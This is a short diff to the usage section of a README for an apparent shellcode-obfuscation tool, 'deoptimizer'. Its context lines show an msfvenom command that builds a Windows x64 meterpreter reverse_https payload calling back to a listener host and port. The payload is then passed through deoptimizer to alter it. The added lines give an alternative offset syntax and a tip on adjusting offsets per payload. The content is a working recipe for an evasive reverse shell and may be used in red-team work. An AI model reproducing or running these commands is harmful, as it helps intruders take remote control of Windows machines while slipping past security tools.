@@ -107,6 +107,9 @@ deoptimizer -a x86 -b 64 -F 1 -f /tmp/shellcode
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=8080 -o shellcode 
 deoptimizer -a x86 -b 64 -F 1 --skip-offsets 275-287 324-574  -f /tmp/shellcode
+# OR
+deoptimizer -a x86 -b 64 -F 1 --skip-offsets 0x113-0x11F,0x144-0x23E  -f /tmp/shellcode
+# Keep in mind that these offsets change depending on your payload settings
 ```
 
 ## Currently Supported Architectures
